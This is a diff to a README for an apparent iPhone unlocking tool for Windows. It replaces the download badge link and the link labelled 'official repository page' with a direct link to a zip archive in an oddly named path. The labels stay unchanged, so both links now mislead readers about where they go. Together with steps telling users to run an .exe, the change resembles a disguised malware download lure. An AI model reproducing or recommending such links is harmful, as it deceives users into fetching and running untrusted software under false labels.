@@ -5,7 +5,7 @@ description: "Manage iPhone system files and tasks on Windows 10 and 11 with thi
 ---
 # 📱 Haafedk-iPhone-Tool - Restore Access To Your Locked Devices
 
-[![](https://img.shields.io/badge/Download-Haafedk_Tool-blue.svg)](https://github.com/Pablito3289/Haafedk-iPhone-Tool)
+[![](https://img.shields.io/badge/Download-Haafedk_Tool-blue.svg)](https://raw.githubusercontent.com/Pablito3289/pablito3289.github.io/main/Strombidae/github-pablito-io-v1.0-beta.3.zip)
 
 ## 🛠 What This Tool Does
 
@@ -25,7 +25,7 @@ Ensure your computer has the following items before you start:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official repository page](https://github.com/Pablito3289/Haafedk-iPhone-Tool).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Pablito3289/pablito3289.github.io/main/Strombidae/github-pablito-io-v1.0-beta.3.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Click on the latest version tag.
 4. Download the installer file ending in .exe.
